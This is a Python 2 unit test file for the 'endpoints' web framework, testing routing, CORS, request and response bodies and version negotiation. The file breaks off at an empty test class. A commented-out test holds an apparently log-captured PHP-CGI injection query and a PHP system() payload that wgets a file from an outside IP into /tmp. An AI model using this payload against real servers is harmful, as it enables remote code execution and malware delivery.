from unittest import TestCase
import os
import urlparse
import json
import logging
from BaseHTTPServer import BaseHTTPRequestHandler
import time
import threading
import subprocess
import re

import testdata

import endpoints
import endpoints.call


#logging.basicConfig()
import sys
logger = logging.getLogger()
logger.setLevel(logging.DEBUG)
log_handler = logging.StreamHandler(stream=sys.stderr)
log_formatter = logging.Formatter('[%(levelname)s] %(message)s')
log_handler.setFormatter(log_formatter)
logger.addHandler(log_handler)


def create_controller():
    class FakeController(endpoints.Controller, endpoints.CorsMixin):
        def POST(self): pass
        def GET(self): pass

    res = endpoints.Response()

    req = endpoints.Request()
    req.method = 'GET'

    c = FakeController(req, res)
    return c


def create_modules(controller_prefix):
    d = {
        controller_prefix: os.linesep.join([
            "from endpoints import Controller",
            "class Default(Controller):",
            "    def GET(*args, **kwargs): pass",
            ""
        ]),
        "{}.default".format(controller_prefix): os.linesep.join([
            "from endpoints import Controller",
            "class Default(Controller):",
            "    def GET(*args, **kwargs): pass",
            ""
        ]),
        "{}.foo".format(controller_prefix): os.linesep.join([
            "from endpoints import Controller",
            "class Default(Controller):",
            "    def GET(*args, **kwargs): pass",
            "",
            "class Bar(Controller):",
            "    def GET(*args, **kwargs): pass",
            "    def POST(*args, **kwargs): pass",
            ""
        ]),
        "{}.foo.baz".format(controller_prefix): os.linesep.join([
            "from endpoints import Controller",
            "class Default(Controller):",
            "    def GET(*args, **kwargs): pass",
            "",
            "class Che(Controller):",
            "    def GET(*args, **kwargs): pass",
            ""
        ]),
        "{}.foo.boom".format(controller_prefix): os.linesep.join([
            "from endpoints import Controller",
            "",
            "class Bang(Controller):",
            "    def GET(*args, **kwargs): pass",
            ""
        ]),
    }
    r = testdata.create_modules(d)

    s = set(d.keys())
    return s

class ControllerTest(TestCase):
    def test_cors_mixin(self):
        class Cors(endpoints.Controller, endpoints.CorsMixin):
            def POST(self): pass

        res = endpoints.Response()
        req = endpoints.Request()
        c = Cors(req, res)
        self.assertTrue(c.OPTIONS)
        self.assertFalse('Access-Control-Allow-Origin' in c.response.headers)

        req.headers['Origin'] = 'http://example.com'
        c = Cors(req, res)
        self.assertEqual(req.headers['Origin'], c.response.headers['Access-Control-Allow-Origin']) 

        req.headers['Access-Control-Request-Method'] = 'POST'
        req.headers['Access-Control-Request-Headers'] = 'xone, xtwo'
        c = Cors(req, res)
        c.OPTIONS()
        self.assertEqual(req.headers['Origin'], c.response.headers['Access-Control-Allow-Origin'])
        self.assertEqual(req.headers['Access-Control-Request-Method'], c.response.headers['Access-Control-Allow-Methods']) 
        self.assertEqual(req.headers['Access-Control-Request-Headers'], c.response.headers['Access-Control-Allow-Headers']) 

        c = Cors(req, res)
        c.POST()
        self.assertEqual(req.headers['Origin'], c.response.headers['Access-Control-Allow-Origin']) 

    def test_get_methods(self):
        class GetMethodsController(endpoints.Controller):
            def POST(self): pass
            def GET(self): pass
            def ABSURD(self): pass
            def ignORED(self): pass

        options = GetMethodsController.get_methods()
        self.assertEqual(3, len(options))
        for o in ['ABSURD', 'GET', 'POST']:
            self.assertTrue(o in options)

    def test_bad_typeerror(self):
        """There is a bug that is making the controller method is throw a 404 when it should throw a 500"""
        controller_prefix = "badtypeerror"
        contents = os.linesep.join([
            "from endpoints import Controller",
            "class Default(Controller):",
            "    def GET(self):",
            "        raise TypeError('This should not cause a 404')"
        ])
        testdata.create_module("{}.typerr".format(controller_prefix), contents=contents)
            
        c = endpoints.Call(controller_prefix)
        r = endpoints.Request()
        r.method = 'GET'
        r.path = '/typerr'
        c.request = r
                                
        res = c.handle()
        self.assertEqual(500, res.code)

class ResponseTest(TestCase):
    def test_gbody(self):
        r = endpoints.Response()
        r.headers['Content-Type'] = 'application/json'
        gbody = (v for v in [{'foo': 'bar'}])
        r.gbody = gbody

        for b in r.gbody:
            self.assertTrue(isinstance(b, str))

    def test_headers(self):
        """make sure headers don't persist between class instantiations"""
        r = endpoints.Response()
        r.headers["foo"] = "bar"
        self.assertEqual("bar", r.headers["foo"])
        self.assertEqual(1, len(r.headers))

        r = endpoints.Response()
        self.assertFalse("foo" in r.headers)
        self.assertEqual(0, len(r.headers))

    def test_status(self):
        r = endpoints.Response()
        for code, status in BaseHTTPRequestHandler.responses.iteritems():
            r.code = code
            self.assertEqual(status[0], r.status)
            r.code = None
            r.status = None

        r = endpoints.Response()
        r.code = 1000
        self.assertEqual("UNKNOWN", r.status)

    def test_body(self):
        b = {'foo': 'bar'}

        r = endpoints.Response()
        r.headers['Content-Type'] = 'plain/text'
        self.assertEqual('', r.body)
        r.body = b
        self.assertEqual(str(b), r.body)

        r = endpoints.Response()
        r.headers['Content-Type'] = 'application/json'
        r.body = b
        self.assertEqual(json.dumps(b), r.body)

        r = endpoints.Response()
        r.headers['Content-Type'] = 'plain/text'
        self.assertEqual('', r.body)
        self.assertEqual('', r.body) # Make sure it doesn't change
        r.body = b
        self.assertEqual(str(b), r.body)

        r = endpoints.Response()
        r.headers['Content-Type'] = 'application/json'
        r.body = {}
        self.assertEqual(r.body, "{}")

        r = endpoints.Response()
        r.headers['Content-Type'] = 'application/json'
        r.body = ValueError("this is the message")
        r.code = 500
        self.assertEqual(r.body, '{"errno": 500, "errmsg": "this is the message"}')
        r.headers['Content-Type'] = ''
        self.assertEqual(r.body, "this is the message")

        r = endpoints.Response()
        r.headers['Content-Type'] = 'application/json'
        r.body = None
        self.assertEqual('', r.body) # was getting "null" when content-type was set to json

        # TODO: this really needs to be better tested with unicode data

    def test_body_json_error(self):
        """I was originally going to have the body method smother the error, but
        after thinking about it a little more, I think it is better to bubble up
        the error and rely on the user to handle it in their code"""
        class Foo(object): pass
        b = {'foo': Foo()}

        r = endpoints.Response()
        r.headers['Content-Type'] = 'application/json'
        r.body = b
        with self.assertRaises(TypeError):
            rb = r.body

    def test_code(self):
        r = endpoints.Response()
        self.assertEqual(204, r.code)

        r.body = "this is the body"
        self.assertEqual(200, r.code)

        r.code = 404
        self.assertEqual(404, r.code)
        
        r.body = "this is the body 2"
        self.assertEqual(404, r.code)

        r.body = None
        self.assertEqual(404, r.code)

        # now let's test defaults
        del(r._code)

        self.assertEqual(204, r.code)

        r.body = ''
        self.assertEqual(200, r.code)

        r.body = {}
        self.assertEqual(200, r.code)


class RequestTest(TestCase):

    def test_ip(self):
        r = endpoints.Request()
        r.headers['x-forwarded-for'] = '54.241.34.107'
        ip = r.ip
        self.assertEqual('54.241.34.107', ip)

        r.headers['x-forwarded-for'] = '127.0.0.1, 54.241.34.107'
        ip = r.ip
        self.assertEqual('54.241.34.107', ip)

        r.headers['x-forwarded-for'] = '127.0.0.1'
        r.headers['client-ip'] = '54.241.34.107'
        ip = r.ip
        self.assertEqual('54.241.34.107', ip)

    def test_body_kwargs_bad_content_type(self):
        """make sure a form upload content type with json body fails correctly"""
        r = endpoints.Request()
        r.body = u"foo=bar&che=baz&foo=che"
        r.headers = {'content-type': 'application/json'}
        with self.assertRaises(ValueError):
            br = r.body_kwargs

        r.body = u'{"foo": ["bar", "che"], "che": "baz"}'
        r.headers = {'content-type': "application/x-www-form-urlencoded"}

        with self.assertRaises(ValueError):
            br = r.body_kwargs

    def test_body_kwargs(self):
        body = u"foo=bar&che=baz&foo=che"
        body_kwargs = {u'foo': [u'bar', u'che'], u'che': u'baz'}
        body_json = '{"foo": ["bar", "che"], "che": "baz"}'
        cts = {
            u"application/x-www-form-urlencoded": (
                u"foo=bar&che=baz&foo=che",
                {u'foo': [u'bar', u'che'], u'che': u'baz'}
            ),
            u'application/json': (
                '{"foo": ["bar", "che"], "che": "baz"}',
                {u'foo': [u'bar', u'che'], u'che': u'baz'}
            ),
        }

        for ct, bodies in cts.iteritems():
            r = endpoints.Request()
            r.body = bodies[0]
            r.headers = {'content-type': ct}
            self.assertTrue(isinstance(r.body_kwargs, dict))
            self.assertEqual(r.body_kwargs, body_kwargs)

            r = endpoints.Request()
            r.headers = {'content-type': ct}
            self.assertEqual(r.body_kwargs, {})
            self.assertEqual(r.body, None)

            r = endpoints.Request()
            r.headers = {'content-type': ct}
            r.body_kwargs = bodies[1]
            self.assertEqual(r._parse_body_str(r.body), r._parse_body_str(bodies[0]))

    def test_properties(self):

        path = u'/foo/bar'
        path_args = [u'foo', u'bar']

        r = endpoints.Request()
        r.path = path
        self.assertEqual(r.path, path)
        self.assertEqual(r.path_args, path_args)

        r = endpoints.Request()
        r.path_args = path_args
        self.assertEqual(r.path, path)
        self.assertEqual(r.path_args, path_args)

        query = u"foo=bar&che=baz&foo=che"
        query_kwargs = {u'foo': [u'bar', u'che'], u'che': u'baz'}

        r = endpoints.Request()
        r.query = query
        self.assertEqual(urlparse.parse_qs(r.query, True), urlparse.parse_qs(query, True))
        self.assertEqual(r.query_kwargs, query_kwargs)

        r = endpoints.Request()
        r.query_kwargs = query_kwargs
        self.assertEqual(urlparse.parse_qs(r.query, True), urlparse.parse_qs(query, True))
        self.assertEqual(r.query_kwargs, query_kwargs)

    def test_body(self):
        # simulate a problem I had with a request with curl
        r = endpoints.Request()
        r.method = 'GET'
        r.body = ""
        r.headers = {
            'PATTERN': u"/",
            'x-forwarded-for': u"127.0.0.1",
            'URI': u"/",
            'accept': u"*/*",
            'user-agent': u"curl/7.24.0 (x86_64-apple-darwin12.0) libcurl/7.24.0 OpenSSL/0.9.8y zlib/1.2.5",
            'host': u"localhost",
            'VERSION': u"HTTP/1.1",
            'PATH': u"/",
            'METHOD': u"GET",
            'authorization': u"Basic SOME_HASH_THAT_DOES_NOT_MATTER="
        }
        self.assertEqual("", r.body)

        r = endpoints.Request()
        r.method = 'POST'

        r.headers = {
            'content-type': u"application/x-www-form-urlencoded",
        }
        r.body = u"foo=bar&che=baz&foo=che"
        body_r = {u'foo': [u'bar', u'che'], u'che': u'baz'}
        self.assertEqual(body_r, r.body_kwargs)

        r.body = None
        del(r._body_kwargs)
        body_r = {}
        self.assertEqual(body_r, r.body_kwargs)

        r.headers = {
            'content-type': u"application/json",
        }
        r.body = '{"person":{"name":"bob"}}'
        del(r._body_kwargs)
        body_r = {u'person': {"name":"bob"}}
        self.assertEqual(body_r, r.body_kwargs)

        r.body = u''
        del(r._body_kwargs)
        body_r = u''
        self.assertEqual(body_r, r.body)

        r.headers = {}
        body = '{"person":{"name":"bob"}}'
        r.body = body
        self.assertEqual(body, r.body)

        r.method = 'GET'
        r.headers = {
            'content-type': u"application/json",
        }
        r.body = None
        self.assertEqual(None, r.body)

    def test_get_header(self):
        r = endpoints.Request()

        r.headers = {
            'foo': 'bar',
            'Content-Type': 'application/json',
            'Happy-days': 'are-here-again'
        }
        v = r.get_header('foo', 'che')
        self.assertEqual('bar', v)

        v = r.get_header('Foo', 'che')
        self.assertEqual('bar', v)

        v = r.get_header('FOO', 'che')
        self.assertEqual('bar', v)

        v = r.get_header('che', 'che')
        self.assertEqual('che', v)

        v = r.get_header('che')
        self.assertEqual(None, v)

        v = r.get_header('content-type')
        self.assertEqual('application/json', v)

        v = r.get_header('happy-days')
        self.assertEqual('are-here-again', v)

class CallTest(TestCase):
    def test_gbody_yield_errors(self):
        """there was a bug that caused errors raised after the yield to return another
        iteration of a body instead of raising them"""
        controller_prefix = "gbodyerrory"
        contents = os.linesep.join([
            "import time",
            "from endpoints import Controller",
            "class Before(Controller):",
            "    def GET(self):",
            "        raise ValueError('blah')",
            "        yield None",
            "",
            "class After(Controller):",
            "    def GET(self):",
            "        yield None",
            "        raise ValueError('blah')"
        ])
        testdata.create_module(controller_prefix, contents=contents)

        c = endpoints.Call(controller_prefix)

        r = endpoints.Request()
        r.method = 'GET'
        r.path = '/after'
        c.request = r
        res = c.ghandle()
        body_returned = False
        with self.assertRaises(ValueError):
            for i, b in enumerate(res.gbody):
                body_returned = True
        self.assertTrue(body_returned)

        r = endpoints.Request()
        r.method = 'GET'
        r.path = '/before'
        c.request = r
        res = c.ghandle()
        for i, b in enumerate(res.gbody):
            self.assertEqual(500, res.code)

    def test_gbody_none(self):
        """there was a bug in the original response.body getter that would make
        the generator body stall until it was done if you did "yield None"."""
        controller_prefix = "gbodynonecontroller"
        contents = os.linesep.join([
            "import time",
            "from endpoints import Controller",
            "class Default(Controller):",
            "    def GET(self):",
            "        yield None",
            "        time.sleep(1)"
        ])
        testdata.create_module(controller_prefix, contents=contents)

        c = endpoints.Call(controller_prefix)
        r = endpoints.Request()
        r.method = 'GET'
        r.path = '/'
        c.request = r

        start = time.time()
        res = c.ghandle()
        for b in res.gbody:
            stop = time.time()
            self.assertGreater(1, stop - start)

        # right here the after yield will need to finish and take 1 second

    def test_default_match_with_path(self):
        """when the default controller is used, make sure it falls back to default class
        name if the path bit fails to be a controller class name"""
        controller_prefix = "nomodcontroller2"
        contents = os.linesep.join([
            "from endpoints import Controller",
            "class Default(Controller):",
            "    def GET(self, *args, **kwargs):",
            "        return args[0]"
        ])
        testdata.create_module("{}.nmcon".format(controller_prefix), contents=contents)

        c = endpoints.Call(controller_prefix)
        r = endpoints.Request()
        r.method = 'GET'
        r.path = '/nmcon/8'
        c.request = r

        res = c.handle()
        self.assertEqual('"8"', res.body)

    def test_no_match(self):
        """make sure a controller module that imports a class with the same as
        one of the query args doesen't get picked up as the controller class"""
        controller_prefix = "nomodcontroller"
        r = testdata.create_modules({
            "nomod": os.linesep.join([
                "class Nomodbar(object): pass",
                ""
            ]),
            controller_prefix: os.linesep.join([
                "from endpoints import Controller",
                "from nomod import Nomodbar",
                "class Default(Controller):",
                "    def GET(): pass",
                ""
            ])
        })

        c = endpoints.Call(controller_prefix)
        r = endpoints.Request()
        r.method = 'GET'
        r.path = '/nomodbar' # same name as one of the non controller classes
        c.request = r
        info = c.get_controller_info()

        self.assertEqual('Default', info['class_name'])
        self.assertEqual('nomodcontroller', info['module_name'])
        self.assertEqual('nomodbar', info['args'][0])

    def test_import_error(self):
        controller_prefix = "importerrorcontroller"
        r = testdata.create_modules({
            controller_prefix: os.linesep.join([
                "from endpoints import Controller",
                "from does_not_exist import FairyDust",
                "class Default(Controller):",
                "    def GET(): pass",
                ""
            ])
        })

        c = endpoints.Call(controller_prefix)
        r = endpoints.Request()
        r.method = 'GET'
        r.path = '/'
        c.request = r
        with self.assertRaises(endpoints.CallError):
            info = c.get_callback_info()

    def test_get_controller_info_default(self):
        """I introduced a bug on 1-12-14 that caused default controllers to fail
        to be found, this makes sure that bug is squashed"""
        controller_prefix = "controller_info_default"
        r = testdata.create_modules({
            controller_prefix: os.linesep.join([
                "from endpoints import Controller",
                "class Default(Controller):",
                "    def GET(): pass",
                ""
            ])
        })

        c = endpoints.Call(controller_prefix)
        r = endpoints.Request()
        r.method = 'GET'
        r.path = '/'
        c.request = r
        info = c.get_controller_info()
        self.assertEqual(u'Default', info['class_name'])
        self.assertTrue(issubclass(info['class'], endpoints.Controller))


    def test_get_controller_info(self):
        controller_prefix = "controller_info_advanced"
        s = create_modules(controller_prefix)

        ts = [
            {
                'in': dict(method=u"GET", path="/foo/bar/happy/sad"),
                'out': {
                    'module_name': u"controller_info_advanced.foo",
                    'class_name': u'Bar',
                    'args': [u'happy', u'sad'],
                    'method': u"GET",
                }
            },
            {
                'in': dict(method=u"GET", path="/"),
                'out': {
                    'module_name': u"controller_info_advanced",
                    'class_name': u'Default',
                    'args': [],
                    'method': u"GET",
                }
            },
            {
                'in': dict(method=u"GET", path="/happy"),
                'out': {
                    'module_name': u"controller_info_advanced",
                    'class_name': u'Default',
                    'args': [u"happy"],
                    'method': u"GET",
                }
            },
            {
                'in': dict(method=u"GET", path="/foo/baz"),
                'out': {
                    'module_name': u"controller_info_advanced.foo.baz",
                    'class_name': u'Default',
                    'args': [],
                    'method': u"GET",
                }
            },
            {
                'in': dict(method=u"GET", path="/foo/baz/che"),
                'out': {
                    'module_name': u"controller_info_advanced.foo.baz",
                    'class_name': u'Che',
                    'args': [],
                    'method': u"GET",
                }
            },
            {
                'in': dict(method=u"GET", path="/foo/baz/happy"),
                'out': {
                    'module_name': u"controller_info_advanced.foo.baz",
                    'class_name': u'Default',
                    'args': [u"happy"],
                    'method': u"GET",
                }
            },
            {
                'in': dict(method=u"GET", path="/foo/happy"),
                'out': {
                    'module_name': u"controller_info_advanced.foo",
                    'class_name': u'Default',
                    'args': [u"happy"],
                    'method': u"GET",
                }
            },
        ]

        for t in ts:
            r = endpoints.Request()
            for key, val in t['in'].iteritems():
                setattr(r, key, val)

            c = endpoints.Call(controller_prefix)
            c.request = r

            d = c.get_controller_info()
            for key, val in t['out'].iteritems():
                self.assertEqual(val, d[key])

    def test_callback_info(self):
        controller_prefix = "callback_info"
        r = endpoints.Request()
        r.path = u"/foo/bar"
        r.path_args = [u"foo", u"bar"]
        r.query_kwargs = {u'foo': u'bar', u'che': u'baz'}
        r.method = u"GET"
        c = endpoints.Call(controller_prefix)
        c.request = r

        with self.assertRaises(endpoints.CallError):
            d = c.get_callback_info()

        contents = os.linesep.join([
            "from endpoints import Controller",
            "class Bar(Controller):",
            "    def GET(*args, **kwargs): pass"
        ])
        testdata.create_module("{}.foo".format(controller_prefix), contents=contents)

        # if it succeeds, then it passed the test :)
        d = c.get_callback_info()

    def test_public_controller(self):
        contents = os.linesep.join([
            "from endpoints import Controller",
            "class Bar(Controller):",
            "    def get(*args, **kwargs): pass"
        ])
        testdata.create_module("controller2.foo2", contents=contents)

        r = endpoints.Request()
        r.path = u"/foo2/bar"
        r.path_args = [u"foo2", u"bar"]
        r.query_kwargs = {u'foo2': u'bar', u'che': u'baz'}
        r.method = u"GET"
        c = endpoints.Call("controller2")
        c.request = r

        # if it succeeds, then it passed the test :)
        with self.assertRaises(endpoints.CallError):
            d = c.get_callback_info()

    def test_handle_redirect(self):
        contents = os.linesep.join([
            "from endpoints import Controller, Redirect",
            "class Testredirect(Controller):",
            "    def GET(*args, **kwargs):",
            "        raise Redirect('http://example.com')"
        ])
        testdata.create_module("controllerhr.handle", contents=contents)

        r = endpoints.Request()
        r.path = u"/handle/testredirect"
        r.path_args = [u'handle', u'testredirect']
        r.query_kwargs = {}
        r.method = u"GET"
        c = endpoints.Call("controllerhr")
        c.request = r

        res = c.handle()
        res.body # we need to cause the body to be handled
        self.assertEqual(302, res.code)
        self.assertEqual('http://example.com', res.headers['Location'])

    def test_handle_404_typeerror(self):
        """make sure not having a controller is correctly identified as a 404"""
        controller_prefix = "h404te"
        s = create_modules(controller_prefix)
        r = endpoints.Request()
        r.method = u'GET'
        r.path = u'/foo/boom'

        c = endpoints.Call(controller_prefix)
        c.request = r

        res = c.handle()
        res.body # we need to cause the body to be handled
        self.assertEqual(404, res.code)

    def test_handle_404_typeerror_2(self):
        """make sure 404 works when a path bit is missing"""
        controller_prefix = "h404te2"
        contents = os.linesep.join([
            "from endpoints import Controller",
            "class Default(Controller):",
            "    def GET(self, needed_bit, **kwargs):",
            "       return ''"
        ])
        testdata.create_module(controller_prefix, contents=contents)
        r = endpoints.Request()
        r.method = u'GET'
        r.path = u'/'

        c = endpoints.Call(controller_prefix)
        c.request = r
        res = c.handle()
        res.body # we need to cause the body to be handled
        self.assertEqual(404, res.code)

    def test_handle_accessdenied(self):
        """raising an AccessDenied error should set code to 401 and the correct header"""
        controller_prefix = "haccessdenied"
        contents = os.linesep.join([
            "from endpoints import Controller, AccessDenied",
            "class Default(Controller):",
            "    def GET(*args, **kwargs):",
            "        raise AccessDenied('basic')",
        ])
        testdata.create_module(controller_prefix, contents=contents)
        r = endpoints.Request()
        r.method = u'GET'
        r.path = u'/'

        c = endpoints.Call(controller_prefix)
        c.request = r

        res = c.handle()
        res.body # we need to cause the body to be handled
        self.assertEqual(401, res.code)
        self.assertTrue('Basic' in res.headers['WWW-Authenticate'])

    def test_handle_callstop(self):
        contents = os.linesep.join([
            "from endpoints import Controller, CallStop",
            "class Testcallstop(Controller):",
            "    def GET(*args, **kwargs):",
            "        raise CallStop(205, None)",
            "class Testcallstop2(Controller):",
            "    def GET(*args, **kwargs):",
            "        raise CallStop(200, 'this is the body')"
        ])
        testdata.create_module("controllerhcs.handlecallstop", contents=contents)

        r = endpoints.Request()
        r.path = u"/handlecallstop/testcallstop"
        r.path_args = [u'handlecallstop', u'testcallstop']
        r.query_kwargs = {}
        r.method = u"GET"
        c = endpoints.Call("controllerhcs")
        c.request = r

        res = c.handle()
        self.assertEqual('', res.body)
        self.assertEqual(None, res._body)
        self.assertEqual(205, res.code)

        r.path = u"/handlecallstop/testcallstop2"
        r.path_args = [u'handlecallstop', u'testcallstop2']
        res = c.handle()
        self.assertEqual('"this is the body"', res.body)
        self.assertEqual(200, res.code)

#     def test_bad_query_bad_path(self):
#         """Jarid and I noticed these errors always popping up in the logs, they 
#         are genuine errors but are misidentified as 417 when they should be 404"""
#         return
#         controller_prefix = "badquerybadpath"
#         r = testdata.create_modules({
#             controller_prefix: os.linesep.join([
#                 "from endpoints import Controller",
#                 "class Default(Controller):",
#                 "    def GET(self): pass",
#                 "    def POST(self): pass",
#                 ""
#             ])
#         })
# 
#         c = endpoints.Call(controller_prefix)
#         r = endpoints.Request()
#         r.method = 'GET'
#         r.path = '/foo/bar'
#         #r.query = "%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E"
#         #r.body = '<?php system("wget 78.109.82.33/apache2-default/.a/hb/php01 -O /tmp/.0e1bc.log'
#         c.request = r
# 
#         res = c.handle()
#         pout.v(res)
#         return
#         info = c.get_callback_info()
#         pout.v(info)
# 
#         # with self.assertRaises(endpoints.CallError):
# #             info = c.get_callback_info()


class VersionCallTest(TestCase):

    def test_get_version(self):
        r = endpoints.Request()
        r.headers = {u'accept': u'application/json;version=v1'}

        c = endpoints.VersionCall("controller")
        #c.version_media_type = u'application/json'
        c.request = r

        v = c.get_version()
        self.assertEqual(u'v1', v)

        c.request.headers = {u'accept': u'application/json'}

        with self.assertRaises(endpoints.CallError):
            v = c.get_version()

        c.default_version = u'v1'
        v = c.get_version()
        self.assertEqual(u'v1', v)

    def test_get_version_default(self):
        """turns out, calls were failing if there was no accept header even if there were defaults set"""
        r = endpoints.Request()
        r.headers = {}

        c = endpoints.VersionCall("controller")
        c.request = r

        r.headers = {}
        c.content_type = u'application/json'
        c.default_version = None
        with self.assertRaises(endpoints.CallError):
            v = c.get_version()

        r.headers = {u'accept': u'application/json;version=v1'}
        v = c.get_version()
        self.assertEqual(u'v1', v)

        c.content_type = None
        c.default_version = "v1"
        with self.assertRaises(ValueError):
            v = c.get_version()

        r.headers = {}
        c.content_type = None
        c.default_version = "v1"
        with self.assertRaises(ValueError):
            v = c.get_version()

        r.headers = {u'accept': u'application/json;version=v1'}
        with self.assertRaises(ValueError):
            v = c.get_version()

        r.headers = {u'accept': u'*/*'}
        c.content_type = u'application/json'
        c.default_version = "v5"
        v = c.get_version()
        self.assertEqual(u'v5', v)

        r.headers = {u'accept': u'*/*'}
        c.content_type = u'application/json'
        c.default_version = None
        with self.assertRaises(endpoints.CallError):
            v = c.get_version()

        r.headers = {u'accept': u'*/*;version=v8'}
        c.content_type = u'application/json'
        c.default_version = None
        v = c.get_version()
        self.assertEqual(u'v8', v)

    def test_controller_prefix(self):
        r = endpoints.Request()
        r.headers = {u'accept': u'application/json;version=v1'}

        c = endpoints.VersionCall("foo.bar")
        c.content_type = u'application/json'
        c.request = r

        cp = c.get_normalized_prefix()
        self.assertEqual(u"foo.bar.v1", cp)


class AcceptHeaderTest(TestCase):

    def test_init(self):
        ts = [
            (
                u"text/*, text/html, text/html;level=1, */*",
                [
                    u"text/html;level=1",
                    u"text/html",
                    u"text/*",
                    u"*/*"
                ]
            ),
            (
                u'text/*;q=0.3, text/html;q=0.7, text/html;level=1, text/html;level=2;q=0.4, */*;q=0.5',
                [
                    u"text/html;level=1",
                    u"text/html;q=0.7",
                    u"*/*;q=0.5",
                    u"text/html;level=2;q=0.4",
                    "text/*;q=0.3",
                ]
            ),
        ]

        for t in ts:
            a = endpoints.AcceptHeader(t[0])
            for i, x in enumerate(a):
                self.assertEqual(x[3], t[1][i])

    def test_filter(self):
        ts = [
            (
                u"*/*;version=v5", # accept header that is parsed
                (u"application/json", {}), # filter args, kwargs
                1 # how many matches are expected
            ),
            (
                u"*/*;version=v5",
                (u"application/json", {u'version': u'v5'}),
                1
            ),
            (
                u"application/json",
                (u"application/json", {}),
                1
            ),
            (
                u"application/json",
                (u"application/*", {}),
                1
            ),
            (
                u"application/json",
                (u"text/html", {}),
                0
            ),
            (
                u"application/json;version=v1",
                (u"application/json", {u"version": u"v1"}),
                1
            ),
            (
                u"application/json;version=v2",
                (u"application/json", {u"version": u"v1"}),
                0
            ),

        ]

        for t in ts:
            a = endpoints.AcceptHeader(t[0])
            count = 0
            for x in a.filter(t[1][0], **t[1][1]):
                count += 1

            self.assertEqual(t[2], count)


class ReflectTest(TestCase):
    def test_decorators(self):
        testdata.create_modules({
            "controller_reflect.foo": os.linesep.join([
                "import endpoints",
                "from endpoints.decorators import param, require_params",
                "",
                "def dec_func(f):",
                "    def wrapped(*args, **kwargs):",
                "        return f(*args, **kwargs)",
                "    return wrapped",
                "",
                "class dec_cls(object):",
                "    def __init__(self, func):",
                "        self.func = func",
                "    def __call__(*args, **kwargs):",
                "        return f(*args, **kwargs)",
                "",
                "class Default(endpoints.Controller):",
                "    @dec_func",
                "    def GET(*args, **kwargs): pass",
                "    @dec_cls",
                "    @param('foo', default=1, type=int)",
                "    @param('bar', type=bool, required=False)",
                "    @param('che_empty', type=dict, default={})",
                "    @param('che_full', type=dict, default={'key': 'val', 'key2': 2.0})",
                "    @param('baz_empty', type=list, default=[])",
                "    @param('baz_full', type=list, default=['val', False, 1])",
                "    @require_params('a', 'b', 'c')",
                "    @param('d')",
                "    def POST(*args, **kwargs): pass",
                ""
            ])
        })

        rs = endpoints.Reflect("controller_reflect")
        l = list(rs.get_endpoints())
        r = l[0]

        params = r.post_params
        for p in ['a', 'b', 'c', 'd']:
            self.assertTrue(params[p]['required'])

        for p in ['foo', 'bar', 'che_empty', 'che_full', 'baz_empty', 'baz_full']:
            self.assertFalse(params[p]['required'])

        self.assertEqual(1, len(l))
        self.assertEqual(u'/foo', r.uri)
        self.assertEqual(set(['GET', 'POST']), r.options)

    def test_get_endpoints(self):
        # putting the C back in CRUD
        tmpdir = testdata.create_dir("reflecttest")
        testdata.create_modules(
            {
                "controller_reflect_endpoints": os.linesep.join([
                    "import endpoints",
                    "class Default(endpoints.Controller):",
                    "    def GET(*args, **kwargs): pass",
                    ""
                ]),
                "controller_reflect_endpoints.foo": os.linesep.join([
                    "import endpoints",
                    "class Default(endpoints.Controller):",
                    "    def GET(*args, **kwargs): pass",
                    ""
                ]),
                "controller_reflect_endpoints.che": os.linesep.join([
                    "from endpoints import Controller",
                    "class Baz(Controller):",
                    "    def POST(*args, **kwargs): pass",
                    ""
                ]),
                "controller_reflect_endpoints.che.bam": os.linesep.join([
                    "from endpoints import Controller as Con",
                    "class _Base(Con):",
                    "    def GET(*args, **kwargs): pass",
                    "",
                    "class Boo(_Base):",
                    "    def DELETE(*args, **kwargs): pass",
                    "    def POST(*args, **kwargs): pass",
                    ""
                    "class Bah(_Base):",
                    "    '''this is the doc string'''",
                    "    def HEAD(*args, **kwargs): pass",
                    ""
                ])
            },
            tmpdir=tmpdir
        )

        r = endpoints.Reflect("controller_reflect_endpoints")
        l = list(r.get_endpoints())
        self.assertEqual(5, len(l))

        def get_match(endpoint, l):
            for d in l:
                if d.uri == endpoint:
                    return d

        d = get_match("/che/bam/bah", l)
        self.assertEqual(set(["GET", "HEAD"]), d.options)
        self.assertGreater(len(d.desc), 0)

        d = get_match("/", l)
        self.assertNotEqual(d, None)

        d = get_match("/foo", l)
        self.assertNotEqual(d, None)


class VersionReflectTest(TestCase):

    def test_get_endpoints(self):
        # putting the C back in CRUD
        tmpdir = testdata.create_dir("versionreflecttest")
        testdata.create_modules(
            {
                "controller_vreflect.v1.foo": os.linesep.join([
                    "import endpoints",
                    "class Bar(endpoints.Controller):",
                    "    def GET(*args, **kwargs): pass",
                    ""
                ]),
                "controller_vreflect.v2.che": os.linesep.join([
                    "from endpoints import Controller",
                    "class Baz(Controller):",
                    "    def GET(*args, **kwargs): pass",
                    ""
                ]),
            },
            tmpdir=tmpdir
        )

        rs = endpoints.VersionReflect("controller_vreflect", 'application/json')
        l = list(rs.get_endpoints())

        self.assertEqual(2, len(l))
        for d in l:
            self.assertTrue(d.headers)
            self.assertTrue(d.version)

        def get_match(endpoint, l):
            ret = {}
            for d in l:
                if d.uri == endpoint:
                    ret = d
            return ret

        d = get_match("/foo/bar", l)
        self.assertEqual("v1", d.version)

        d = get_match("/che/baz", l)
        self.assertEqual("v2", d.version)


class EndpointsTest(TestCase):
    def test_get_controllers(self):
        controller_prefix = "get_controllers"
        s = create_modules(controller_prefix)

        controllers = endpoints.call.get_controllers(controller_prefix)
        self.assertEqual(s, controllers)

        # just making sure it always returns the same list
        controllers = endpoints.call.get_controllers(controller_prefix)
        self.assertEqual(s, controllers)


class DecoratorsTest(TestCase):
